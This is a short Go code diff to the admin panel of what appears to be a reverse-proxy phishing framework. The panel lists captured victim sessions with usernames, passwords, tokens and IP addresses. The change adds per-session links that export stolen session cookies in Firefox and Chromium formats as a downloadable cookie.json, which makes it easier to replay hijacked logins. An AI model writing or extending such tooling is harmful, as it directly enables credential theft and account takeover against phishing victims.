@@ -20,10 +20,11 @@ func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
 	log.Debug("Starting handleSessions")
 
 	var body string
+	var cookiedownloadlinks string
 
 	//terminal.go 339
 
-	cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "landing url", "time"}
+	cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "landing url", "time", "Download Cookie"}
 	sessions, err := a.db.ListSessions()
 	if err != nil {
 		panic(err)
@@ -37,7 +38,8 @@ func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
 			if len(s.Tokens) > 0 {
 				tcol = "captured"
 			}
-			row := []string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, tcol, s.RemoteAddr, s.LandingURL, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
+			cookiedownloadlinks = "<a href='./sessions/download/" + strconv.Itoa(s.Id) + "/Ff'>Ff</a>; <a href='./sessions/download/" + strconv.Itoa(s.Id) + "/Chromium'>Chromium</a>"
+			row := []string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, tcol, s.RemoteAddr, s.LandingURL, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"), cookiedownloadlinks}
 			rows = append(rows, row)
 		}
 
@@ -82,6 +84,7 @@ func (a *AdminPanel) downloadSession(w http.ResponseWriter, r *http.Request) {
 
 		w.WriteHeader(http.StatusOK)
 		w.Header().Set("content-type", "application/json")
+		w.Header().Set("Content-Disposition", "attachment; filename='cookie.json'")
 		w.Write([]byte(body))
 	} else {
 		w.WriteHeader(http.StatusNotFound)
